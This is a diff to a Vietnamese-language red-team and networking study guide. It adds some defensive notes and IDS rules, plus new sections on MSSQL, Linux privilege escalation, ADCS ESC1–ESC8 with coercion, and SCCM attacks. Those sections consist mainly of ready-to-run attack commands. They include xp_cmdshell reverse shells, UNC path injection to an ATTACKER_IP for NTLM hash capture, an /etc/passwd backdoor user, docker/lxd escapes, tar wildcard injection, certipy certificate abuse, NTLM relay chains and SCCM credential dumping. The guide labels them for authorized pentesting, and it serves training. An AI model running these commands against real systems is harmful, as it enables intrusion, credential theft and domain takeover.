@@ -84,6 +84,12 @@
 - [PHẦN 43: DEFENSE ADDITIONS](#phần-43-defense-additions) — Defense cho Wireless, Kerberos/AD, API attacks
 - [PHẦN 44: CROSS-REFERENCES & LEARNING PATH](#phần-44-cross-references--learning-path) — Cross-reference map, Learning path, Cheat sheet, Resources
 
+**Red Team Deep Dive:**
+- [PHẦN 45: MSSQL ATTACKS](#phần-45-mssql-attacks) — xp_cmdshell, Linked Servers, UNC injection, PowerUpSQL
+- [PHẦN 46: LINUX PRIVILEGE ESCALATION](#phần-46-linux-privilege-escalation) — SUID, capabilities, sudo, cron, PATH hijack, Docker/LXD, kernel exploits
+- [PHẦN 47: ADCS ESC1-ESC8 & COERCION](#phần-47-adcs-esc1-esc8--coercion-techniques) — All ESC variants, PetitPotam, PrinterBug, DFSCoerce, Coercer
+- [PHẦN 48: SCCM/MECM ATTACKS](#phần-48-sccmmecm-attacks) — NAA extraction, PXE boot, CMPivot abuse
+
 ---
 
 # PHẦN 1: NỀN TẢNG MẠNG
@@ -716,8 +722,12 @@ Internal: 192.168.1.12:54321 → Router NAT → 203.0.113.1:40003 → Internet
 
 **Góc nhìn Security**:
 - NAT không phải firewall! Nó giấu IP internal nhưng không block traffic
-- NAT traversal: Kỹ thuật để kết nối qua NAT (STUN, TURN, ICE)
-- Reverse shell phải "gọi ra" (outbound) vì NAT block inbound mặc định
+- NAT traversal: Kỹ thuật để kết nối qua NAT:
+  - **STUN** (Session Traversal Utilities for NAT): Client hỏi STUN server "IP public của tôi là gì?" → dùng IP đó cho P2P
+  - **TURN** (Traversal Using Relays around NAT): Khi P2P thất bại, relay qua TURN server (chậm hơn nhưng luôn hoạt động)
+  - **ICE** (Interactive Connectivity Establishment): Framework tự động thử STUN trước, fallback sang TURN
+  - Dùng trong: WebRTC, VoIP, video call, P2P games
+- Reverse shell phải "gọi ra" (outbound) vì NAT block inbound mặc định (bind shell không qua NAT được)
 
 ---
 
@@ -1561,6 +1571,14 @@ dsniff -i eth0
 wireshark &
 ```
 
+**Phòng chống Sniffing:**
+- Encrypt mọi traffic: TLS/HTTPS, SSH, VPN (không dùng FTP/Telnet/HTTP plaintext)
+- Switch thay hub (switch gửi frame đúng port, không broadcast)
+- Port Security trên switch (giới hạn MAC per port)
+- 802.1X authentication (chỉ authenticated devices mới access network)
+- Network segmentation (giảm broadcast domain)
+- Detect ARP spoofing (DAI) → ngăn active sniffing
+
 ---
 
 # PHẦN 5: RED TEAM NETWORKING
@@ -1767,6 +1785,13 @@ iodine -f -P password tunnel.attacker.com
 ssh user@10.0.0.1 -D 1080    # SOCKS proxy qua DNS tunnel
 ```
 
+**Phòng chống DNS Tunneling:**
+- Restrict outbound DNS: chỉ cho internal DNS resolver query ra ngoài (block client → external DNS trực tiếp)
+- Monitor DNS query patterns: subdomain length > 50 chars, high TXT record volume, high entropy subdomains
+- DNS firewall / Response Policy Zone (RPZ)
+- Analyze DNS query frequency per client (> 100 queries/min = suspicious)
+- IDS: `alert dns any any -> any any (dns.query; content:"|3F|"; byte_test:1,>,50,0; msg:"Long DNS subdomain"; sid:2;)`
+
 ### ICMP Tunneling
 
 ```bash
@@ -1786,6 +1811,12 @@ ptunnel-ng -r22 -R22
 ptunnel-ng -p server-ip -l 8022 -r22 -R22
 ssh -p 8022 user@127.0.0.1
 ```
+
+**Phòng chống ICMP Tunneling:**
+- Block/restrict ICMP echo outbound tại firewall (hoặc limit payload size ≤ 64 bytes)
+- Deep Packet Inspection trên ICMP (payload > 64 bytes = suspicious)
+- Monitor ICMP traffic volume (bất thường = tunneling)
+- IDS rule: `alert icmp any any -> any any (dsize:>100; msg:"Large ICMP payload"; sid:1;)`
 
 ### HTTP/HTTPS Tunneling
 
@@ -2012,7 +2043,7 @@ Tools → Rewrite
 === Throttling ===
 Proxy → Throttle Settings
 - Giả lập mạng chậm (3G, EDGE, v.v.)
-- Ẩn có tầm ảnh hưởng rõ: Test app khi mạng yếu
+- Hữu ích để test app khi mạng yếu
 
 === Repeat / Compose ===
 - Right-click → Repeat: Gửi lại request
@@ -2920,7 +2951,12 @@ for pkt in packets:
    - Transport Mode: Encrypt payload, giữ nguyên IP header
    - Tunnel Mode: Encrypt toàn bộ packet, thêm IP header mới
    - Protocols: ESP (Encapsulating Security Payload), AH (Authentication Header)
-   - IKE (Internet Key Exchange) cho key negotiation
+   - IKE (Internet Key Exchange) cho key negotiation:
+     Phase 1 (ISAKMP SA): Authenticate peers, tạo secure channel
+       - Main Mode (6 packets, bảo mật identity) vs Aggressive Mode (3 packets, lộ identity → hash capture!)
+     Phase 2 (Quick Mode): Negotiate IPsec SA (encryption + integrity cho data)
+       - Tạo session keys cho ESP/AH
+   - Attack surface: Aggressive Mode hash capture → offline crack password
 
 2. SSL/TLS VPN
    - Hoạt động ở Layer 4-7
@@ -6863,6 +6899,14 @@ CC8: Change Management
 ## 32.3 SD-WAN & SASE
 
 ```
+=== MPLS (Multiprotocol Label Switching) ===
+Công nghệ WAN truyền thống, forward packets theo LABELS thay vì IP lookup.
+- Router gán label (20-bit) cho packet tại ingress → forward theo label → strip tại egress
+- Label Switched Path (LSP): Đường đi cố định qua mạng MPLS
+- Ưu điểm: Nhanh (label lookup < IP lookup), QoS guarantees, VPN isolation
+- Nhược điểm: ĐẮT (thuê riêng từ ISP), không flexible, không encrypt mặc định
+- Bị thay thế dần bởi SD-WAN (rẻ hơn, dùng internet thường + encryption)
+
 === SD-WAN (Software-Defined WAN) ===
 Overlay network trên multiple WAN links (MPLS, broadband, LTE)
 
@@ -8710,6 +8754,330 @@ Tools Documentation:
 - Metasploit: https://docs.metasploit.com/
 - Burp Suite: https://portswigger.net/web-security
 - MITRE ATT&CK: https://attack.mitre.org/
+```
+
+---
+
+# PHẦN 45: MSSQL ATTACKS
+
+> **CHỈ DÙNG TRONG AUTHORIZED PENTEST.**
+
+## 45.1 MSSQL Enumeration & Access
+
+```bash
+# === Discovery ===
+nmap -sV -p 1433 --script ms-sql-info 192.168.1.0/24
+
+# === Connect (Impacket) ===
+mssqlclient.py domain/user:password@target -windows-auth
+mssqlclient.py sa:password@target                    # SA account
+
+# === Connect (sqsh / sqlcmd) ===
+sqsh -S target -U sa -P password
+sqlcmd -S target -U sa -P password
+```
+
+## 45.2 MSSQL Exploitation
+
+```sql
+-- === Enable xp_cmdshell (RCE) ===
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'powershell -e <base64_reverse_shell>';
+
+-- === UNC Path Injection (Capture NTLM Hash) ===
+-- Trên attacker: sudo responder -I eth0 hoặc smbserver.py
+EXEC xp_dirtree '\\ATTACKER_IP\share';
+-- Hoặc:
+EXEC xp_fileexist '\\ATTACKER_IP\share\file';
+-- → Responder/smbserver capture Net-NTLMv2 hash → crack hoặc relay!
+
+-- === Linked Server Exploitation ===
+-- Enumerate linked servers
+EXEC sp_linkedservers;
+-- Execute on linked server (lateral movement!)
+EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER_NAME];
+-- Double hop:
+EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [THIRD_SERVER]') AT [SECOND_SERVER];
+
+-- === Privilege Escalation ===
+-- Impersonate another user
+EXECUTE AS LOGIN = 'sa';
+EXEC xp_cmdshell 'whoami';
+-- Check impersonation rights
+SELECT DISTINCT b.name FROM sys.server_permissions a
+JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE';
+
+-- === Read Files ===
+SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS Contents;
+
+-- === OLE Automation (alternative RCE) ===
+EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+DECLARE @cmd INT;
+EXEC sp_oacreate 'wscript.shell', @cmd OUTPUT;
+EXEC sp_oamethod @cmd, 'run', NULL, 'cmd /c whoami > C:\temp\output.txt';
+```
+
+```bash
+# === PowerUpSQL (PowerShell module) ===
+Import-Module .\PowerUpSQL.ps1
+Get-SQLInstanceDomain                    # Find SQL instances in domain
+Get-SQLServerInfo -Instance target       # Server info
+Invoke-SQLAudit -Instance target         # Auto audit
+Get-SQLServerLinkCrawl -Instance target  # Crawl linked servers
+```
+
+---
+
+# PHẦN 46: LINUX PRIVILEGE ESCALATION
+
+> Tổng hợp có hệ thống — từ enumeration đến exploitation.
+
+## 46.1 Enumeration
+
+```bash
+# === System Info ===
+uname -a                          # Kernel version → searchsploit
+cat /etc/os-release               # Distro + version
+hostname && id && whoami
+
+# === SUID Binaries ===
+find / -perm -u=s -type f 2>/dev/null
+# So sánh với GTFOBins: https://gtfobins.github.io/
+# Ví dụ: find, vim, python, bash, nmap, cp có SUID → root
+
+# === Linux Capabilities ===
+getcap -r / 2>/dev/null
+# cap_setuid+ep trên python3 → root:
+# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# === Sudo Permissions ===
+sudo -l
+# (ALL) NOPASSWD: /usr/bin/vim → sudo vim -c ':!bash'
+# (ALL) NOPASSWD: /usr/bin/find → sudo find . -exec /bin/bash \;
+# (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'import os; os.system("/bin/bash")'
+
+# === Cron Jobs ===
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+# Writable script in cron → inject reverse shell
+
+# === Writable Files ===
+find / -writable -type f 2>/dev/null | grep -v proc
+# /etc/passwd writable → add root user:
+echo 'backdoor:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd
+
+# === PATH Hijacking ===
+# SUID binary gọi command KHÔNG dùng full path (ví dụ: "service" thay "/usr/sbin/service")
+echo '/bin/bash' > /tmp/service
+chmod +x /tmp/service
+export PATH=/tmp:$PATH
+./vulnerable_suid_binary        # Chạy /tmp/service thay vì /usr/sbin/service → root!
+
+# === Automated Tools ===
+# LinPEAS:
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+# LinEnum:
+./LinEnum.sh -t
+# pspy (monitor processes without root):
+./pspy64
+```
+
+## 46.2 Kernel Exploits
+
+```bash
+uname -r                          # Kernel version
+searchsploit linux kernel $(uname -r | cut -d'-' -f1)
+# Compile on attacker (same arch), upload, execute
+
+# Common: DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)
+# PwnKit (CVE-2021-4034 - pkexec)
+```
+
+## 46.3 Special Groups & Containers
+
+```bash
+# === Docker Group ===
+id | grep docker
+docker run -v /:/mnt --rm -it alpine chroot /mnt bash
+# → root on host filesystem!
+
+# === LXD/LXC Group ===
+lxc image import alpine.tar.gz --alias alpine
+lxc init alpine privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root
+lxc start privesc && lxc exec privesc /bin/sh
+# → root on host via /mnt/root
+
+# === Wildcard Injection ===
+# Nếu cron chạy: tar czf /backup/backup.tar.gz *
+echo '' > '--checkpoint=1'
+echo '' > '--checkpoint-action=exec=bash shell.sh'
+# tar interpret filenames starting with -- as flags → execute shell.sh as cron user
+```
+
+---
+
+# PHẦN 47: ADCS ESC1-ESC8 & COERCION TECHNIQUES
+
+> Active Directory Certificate Services — tất cả attack vectors.
+
+## 47.1 ADCS Enumeration
+
+```bash
+# Certipy (Python — recommended)
+certipy find -u user@domain -p password -dc-ip DC_IP -vulnerable
+# Output: text + JSON + BloodHound-compatible
+
+# Certify (C# — .NET)
+Certify.exe find /vulnerable
+```
+
+## 47.2 ADCS ESC1-ESC8
+
+```bash
+# ═══ ESC1: Misconfigured Certificate Template ═══
+# Điều kiện: Template cho phép requestor specify SAN (Subject Alternative Name)
+# + Enrollee có enrollment rights + Manager approval disabled
+# → Request cert AS anyone (Domain Admin!)
+certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate \
+  -upn administrator@domain -dc-ip DC_IP
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+
+# ═══ ESC2: Any Purpose EKU / No EKU ═══
+# Template có EKU = "Any Purpose" (OID 2.5.29.37.0) hoặc không có EKU
+# → Cert dùng cho BẤT KỲ purpose nào (client auth, code signing, etc.)
+# Exploit tương tự ESC1 nếu kết hợp với SAN misconfiguration
+
+# ═══ ESC3: Certificate Request Agent ═══
+# Template có EKU = "Certificate Request Agent" (OID 1.3.6.1.4.1.311.20.2.1)
+# Step 1: Enroll cho Certificate Request Agent template
+# Step 2: Dùng agent cert để request cert ON BEHALF OF another user
+certipy req -u user@domain -p password -ca CA-NAME -template AgentTemplate
+certipy req -u user@domain -p password -ca CA-NAME -template UserTemplate \
+  -on-behalf-of 'domain\administrator' -pfx agent.pfx
+
+# ═══ ESC4: Vulnerable Template ACL ═══
+# Attacker có Write permission trên template object
+# → Modify template: enable SAN, set enrollment rights → thành ESC1!
+certipy template -u user@domain -p password -template VulnTemplate \
+  -save-old -dc-ip DC_IP
+# (modifies template to be vulnerable, then exploit as ESC1)
+
+# ═══ ESC5: Vulnerable PKI Object ACLs ═══
+# Write permission trên CA object, NTAuthCertificates, hoặc PKI containers
+# → Có thể add rogue CA, modify trust anchors
+# Less common, requires specific AD object permissions
+
+# ═══ ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 on CA ═══
+# CA có flag EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
+# → BẤT KỲ template nào cũng cho phép specify SAN!
+# Check: certutil -config "CA\CA-NAME" -getreg policy\EditFlags
+# Exploit: request cert với SAN cho bất kỳ user
+certipy req -u user@domain -p password -ca CA-NAME -template User \
+  -upn administrator@domain
+
+# ═══ ESC7: Vulnerable CA ACL ═══
+# Attacker có ManageCA hoặc ManageCertificates permission trên CA
+# ManageCA → enable EDITF_ATTRIBUTESUBJECTALTNAME2 (biến thành ESC6)
+# ManageCertificates → approve pending requests
+certipy ca -u user@domain -p password -ca CA-NAME -enable-template SubCA
+certipy req -u user@domain -p password -ca CA-NAME -template SubCA \
+  -upn administrator@domain
+# Request bị denied → nhưng ManageCertificates có thể approve:
+certipy ca -u user@domain -p password -ca CA-NAME -issue-request REQUEST_ID
+certipy req -u user@domain -p password -ca CA-NAME -retrieve REQUEST_ID
+
+# ═══ ESC8: NTLM Relay to ADCS HTTP Enrollment ═══
+# ADCS Web Enrollment exposed → relay NTLM auth đến đó → get cert
+ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp \
+  -smb2support --adcs --template DomainController
+# Coerce DC to authenticate:
+PetitPotam.py attacker-ip dc-ip
+# ntlmrelayx captures cert → authenticate as DC!
+```
+
+## 47.3 Coercion Techniques (Force Authentication)
+
+```bash
+# ═══ PetitPotam (MS-EFSRPC) ═══
+# Force target to authenticate to attacker via EFS RPC
+PetitPotam.py attacker-ip target-ip              # Unauthenticated (patched in 2021)
+PetitPotam.py -u user -p password -d domain attacker-ip target-ip  # Authenticated
+
+# ═══ PrinterBug / SpoolSample (MS-RPRN) ═══
+# Force target (with Print Spooler running) to authenticate
+SpoolSample.exe target-ip attacker-ip             # C# tool
+printerbug.py domain/user:password@target-ip attacker-ip  # Python
+
+# ═══ DFSCoerce (MS-DFSNM) ═══
+dfscoerce.py -u user -p password -d domain attacker-ip target-ip
+
+# ═══ ShadowCoerce (MS-FSRVP) ═══
+shadowcoerce.py -u user -p password -d domain attacker-ip target-ip
+
+# ═══ Coercer (All-in-one — tests ALL coercion methods) ═══
+pip3 install coercer
+Coercer coerce -u user -p password -d domain -l attacker-ip -t target-ip
+# Tests: PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, và nhiều RPC calls khác
+
+# ═══ Typical Coercion → Relay Chain ═══
+# Step 1: Start relay
+ntlmrelayx.py -t ldap://dc-ip --delegate-access    # RBCD attack
+# Step 2: Coerce target
+Coercer coerce -u user -p password -d domain -l attacker-ip -t target-ip
+# Step 3: ntlmrelayx creates machine account + sets RBCD
+# Step 4: Get service ticket
+getST.py -spn cifs/target-ip domain/MACHINE\$:password -impersonate administrator
+# Step 5: Use ticket
+export KRB5CCNAME=administrator.ccache
+psexec.py -k -no-pass domain/administrator@target-ip
+```
+
+---
+
+# PHẦN 48: SCCM/MECM ATTACKS
+
+> System Center Configuration Manager — heavily deployed in enterprise.
+> **CHỈ DÙNG TRONG AUTHORIZED PENTEST.**
+
+```bash
+# === Enumeration ===
+# Tìm SCCM infrastructure trong AD
+# LDAP: OU=System Management hoặc CN=System Management
+ldapsearch -x -H ldap://dc-ip -D user@domain -w password \
+  -b "CN=System Management,CN=System,DC=domain,DC=com"
+
+# SharpSCCM (C#)
+SharpSCCM.exe local site-info          # Get site code, MP, DP
+SharpSCCM.exe get site-info -mp SCCM_SERVER
+
+# === Network Access Account (NAA) Credential Extraction ===
+# NAA credentials cached on SCCM clients (encrypted with DPAPI)
+# SharpSCCM:
+SharpSCCM.exe local naa                # Dump NAA creds from local client
+# Hoặc từ SCCM database nếu có admin access
+
+# === PXE Boot Media Credential Extraction ===
+# SCCM PXE boot có thể chứa credentials
+# pxethiefy:
+python3 pxethiefy.py 2 SCCM_PXE_SERVER
+# Capture PXE boot media → extract task sequence → find embedded credentials
+
+# === CMPivot Abuse ===
+# Nếu có SCCM Admin access → CMPivot = remote code execution trên ALL managed devices
+# Run arbitrary scripts, queries, file operations on any managed client
+# CMPivot query example: Device.Run("whoami")
+
+# === Defense ===
+# Restrict SCCM admin roles (principle of least privilege)
+# Disable PXE boot media password or use strong passwords
+# Monitor NAA credential usage
+# Use Enhanced HTTP (no NAA needed)
+# Audit CMPivot usage via SCCM logs
 ```
 
 ---
